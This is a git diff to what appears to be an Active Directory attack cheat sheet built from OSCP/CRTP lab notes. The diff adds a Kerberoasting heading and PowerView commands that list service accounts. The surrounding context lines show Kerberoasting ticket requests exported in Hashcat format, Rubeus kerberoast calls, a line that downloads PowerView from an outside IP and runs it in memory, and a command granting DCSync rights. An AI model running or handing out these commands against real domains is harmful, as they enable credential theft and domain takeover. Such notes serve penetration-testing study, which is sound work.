@@ -1159,6 +1159,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentl
 Request-SPNTicket -SPN "HTTP/MyServiceComputer.TECH.LOCAL" -Format Hashcat
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 ```
+##### KERBEROASTING - EXPORT TICKET
 ```
 Rubeus.exe kerberoast /stats
 Rubeus.exe kerberoast /user:analystm2 /nowrap
@@ -2655,11 +2656,11 @@ Get-ObjectAcl -Distinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/PowerView.ps1")
 Add-ObjectAcl -TargetDistinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountname student209 -Rights Dcsync -Verbose
 ```
-
-
-
-
-
+##### POWERVIEW OLD - LISTAR SPN
+```
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+```
 
 
 
